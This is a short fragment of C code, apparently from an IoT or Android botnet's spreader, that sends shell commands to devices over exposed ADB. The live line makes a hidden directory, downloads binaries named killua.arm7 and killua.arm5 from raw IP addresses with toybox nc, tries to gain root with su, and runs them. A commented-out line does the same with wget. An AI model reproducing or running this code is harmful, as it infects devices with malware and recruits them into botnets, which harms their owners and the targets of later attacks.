...
//        adb_send_data(pp->data.fd, "shell:cd /data/local/tmp; wget http://193.32.162.27/bins/parm; wget http://193.32.162.27/bins/parm7; wget http://193.32.162.27/bins/parm6; wget http://193.32.162.27/bins/parm5; chmod +x *; ./parm test; ./parm7 test7; ./parm6 test6; ./parm5 test5;");
        adb_send_data(pp->data.fd, "shell:cd /data/local/tmp; su 0 mkdir .kittylover321 || mkdir .kittylover321; cd .kittylover321; toybox nc 176.65.138.28 3337 > killua.arm7; toybox nc 176.65.138.28 3335 > killua.arm5; su 0 chmod 777 killua.arm7 killua.arm5 || chmod 777 killua.arm7 killua.arm5; su 0 ./killua.arm7 arm7; ./killua.arm5; su 0 ./killua.arm7 arm5 || ./killua.arm5 arm5;");
